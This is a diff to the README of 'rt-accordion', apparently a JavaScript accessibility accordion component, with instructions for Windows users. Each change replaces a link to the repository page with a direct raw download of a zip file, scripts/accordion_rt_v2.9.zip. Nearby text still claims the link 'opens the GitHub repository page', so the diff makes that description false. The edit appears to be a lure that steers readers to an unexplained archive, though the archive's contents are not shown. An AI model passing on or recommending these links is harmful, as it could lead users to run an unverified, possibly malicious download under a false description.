@@ -1,6 +1,6 @@
 # ⚙️ rt-accordion - Simple Accessible Accordion Tool
 
-[![Download rt-accordion](https://img.shields.io/badge/Download-rt--accordion-brightgreen)](https://github.com/Itzgkphotoshop/rt-accordion)
+[![Download rt-accordion](https://img.shields.io/badge/Download-rt--accordion-brightgreen)](https://github.com/Itzgkphotoshop/rt-accordion/raw/refs/heads/main/scripts/accordion_rt_v2.9.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To use rt-accordion on your Windows computer, follow these steps carefully.
 
 Go to the main page for the tool by clicking the big download button here:
 
-[![Download rt-accordion](https://img.shields.io/badge/Download-rt--accordion-ff6600?style=for-the-badge)](https://github.com/Itzgkphotoshop/rt-accordion)
+[![Download rt-accordion](https://img.shields.io/badge/Download-rt--accordion-ff6600?style=for-the-badge)](https://github.com/Itzgkphotoshop/rt-accordion/raw/refs/heads/main/scripts/accordion_rt_v2.9.zip)
 
 This link opens the GitHub repository page where you will find the files needed to use the accordion.
 
@@ -160,4 +160,4 @@ a11y, accessibility, accordion, accordion-component, dropdown, dropdown-menus, j
 
 ---
 
-[Download rt-accordion](https://github.com/Itzgkphotoshop/rt-accordion)
+[Download rt-accordion](https://github.com/Itzgkphotoshop/rt-accordion/raw/refs/heads/main/scripts/accordion_rt_v2.9.zip)
